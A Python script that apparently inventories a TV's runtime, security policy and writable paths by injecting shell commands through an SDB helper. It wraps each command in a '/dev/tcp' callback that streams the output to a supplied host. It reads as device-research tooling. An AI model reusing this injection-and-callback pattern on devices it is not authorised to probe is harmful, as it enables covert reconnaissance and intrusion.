#!/usr/bin/env python3
"""Fixed read-only Q74T runtime queries using an explicitly supplied SDB helper.

The helper uses temporary /tmp gates. No firmware, boot or account changes.
Reports stay outside the repository; never commit live device details.
"""
import argparse
import importlib.util
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

QUERIES = {
    'identity': 'id;cat /proc/self/attr/current;sed -n "/^Cap/p" /proc/self/status',
    'platform': 'uname -m;cat /etc/os-release',
    'node': '/usr/bin/node -p "JSON.stringify(process.versions)"',
    'launchers': 'ls -ld /usr/bin/node /usr/bin/dotnet /usr/bin/dotnet-launcher;getcap /usr/bin/node /usr/bin/dotnet-launcher',
    'runtimes': 'ls /usr/share/dotnet/shared/Microsoft.NETCore.App;command -v sh tar nohup setsid sha256sum',
    'staging': 'ls -ld /home/owner/share/tmp/sdk_tools /tmp;test -w /home/owner/share/tmp/sdk_tools && echo STAGE_WRITABLE',
    'execution-policy': 'ls /sys/kernel/security;cat /proc/sys/kernel/uep* 2>/dev/null;echo POLICY_QUERY_DONE',
    'services': 'test -d /opt/usr/home/owner/apps_rw/vetrotvapp && echo VETRO_INSTALLED;echo SERVICE_QUERY_DONE',
}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--tv', required=True)
    parser.add_argument('--host', required=True)
    parser.add_argument('--sdb', type=Path, required=True)
    parser.add_argument('--helper', type=Path, required=True)
    parser.add_argument('--output', type=Path, required=True)
    args = parser.parse_args()
    spec = importlib.util.spec_from_file_location('q74t_inventory_sdb', args.helper)
    helper = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = helper
    spec.loader.exec_module(helper)
    client = helper.SdbClient(args.sdb, args.tv, timeout=8)
    report = {'time_utc': datetime.now(timezone.utc).isoformat(),
              'scope': 'SDK-context runtime inventory, not a new root execution test', 'queries': {}}
    args.output.parent.mkdir(parents=True, exist_ok=True)

    def save():
        args.output.write_text(json.dumps(report, indent=2) + '\n')
        args.output.chmod(0o600)

    try:
        client.connect()
        client.require_device()
        for name, command in QUERIES.items():
            # Refuse the helper's automatic file-staging fallback.
            wrapped = ('exec 3<>/dev/tcp/' + args.host + '/65535;{ ' + command
                       + '; } >&3 2>&3;printf \'\\n[exit:%s]\\n\' "$?" >&3;exec 3>&-')
            if helper._injection_argument_size(wrapped) > helper.SDB_APPINSTALL_MAX_SAFE_BYTES:
                raise RuntimeError('Query too long for unstaged capture: ' + name)
            result = client.capture(command, callback_host=args.host, bind_host=args.host, timeout=8)
            report['queries'][name] = {'output': result.output,
                                       'transport_returncode': result.transport_returncode}
            save()
            print(name + ': ' + result.output.strip(), flush=True)
    except Exception as error:
        report['error'] = str(error)
        save()
        raise
    save()


if __name__ == '__main__':
    main()
